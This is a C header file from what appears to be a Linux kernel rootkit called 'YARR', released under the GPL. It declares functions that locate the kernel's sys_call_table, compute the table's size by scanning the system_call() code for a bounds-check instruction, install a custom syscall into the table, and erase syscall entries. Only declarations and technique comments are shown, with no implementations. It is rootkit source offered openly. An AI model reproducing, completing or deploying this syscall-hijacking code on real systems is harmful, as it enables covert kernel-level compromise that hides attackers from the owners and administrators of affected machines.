/*
 *  YARR - Yet Another Repetitive Rootkit
 *  Copyright (C) 2011 Ole 
 *
 *  This program is free software; you can redistribute it and/or modify
 *  it under the terms of the GNU General Public License as published by
 *  the Free Software Foundation; either version 1, or (at your option)
 *  any later version.
 *
 *  This program is distributed in the hope that it will be useful,
 *  but WITHOUT ANY WARRANTY; without even the implied warranty of
 *  MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the 
 *  GNU General Public License for more details.
 *
 *  You should have received a copy of the GNU General Public License
 *  along with this program; if not, write to the Free Software
 *  Foundation, Inc., 675 Mass Ave, Cambridge, MA 02139, USA.
 */

#ifndef __YARR_BOARD_THOSE_SYSCALLS_YOU_LANDLUBBERS
#define __YARR_BOARD_THOSE_SYSCALLS_YOU_LANDLUBBERS

#include "types.h"

/***
 * Returns the address of the sys_call_table.
 *
 * @return: A pointer to the sys_call_table.
 */
unsigned long **getSyscallTable(void);

/***
 * Returns the sys_call_table size. Since the kernel does not maintain a symbol
 * with the size it has to be calculated on-the-fly, the technique used here is
 * going into the system_call() function code and search the cmpl instruction
 * that checks that the syscall vector requested by user processes is not out
 * of range, that instruction has the length hardcoded.
 *
 * @return: The size of the sys_call_table.
 */
int getSyscallTableSize(void);

/***
 * Install the yarrSyscall as a new entry in the sys_call_table at the given
 * position.
 *
 * @n: The position where yarrSyscall must be installed.
 * @return: Zero if sucessful or -1 if there were errors.
 */
int installSyscall(unsigned int n);

/***
 * Erase the nth system call by making that sys_call_table entry point to NULL.
 *
 * @n: The position of the syscall to be erased.
 * @return: Zero if sucessful or -1 if there were errors.
 */
int uninstallSyscall(unsigned int n);

#endif /* __YARR_BOARD_THOSE_SYSCALLS_YOU_LANDLUBBERS. */
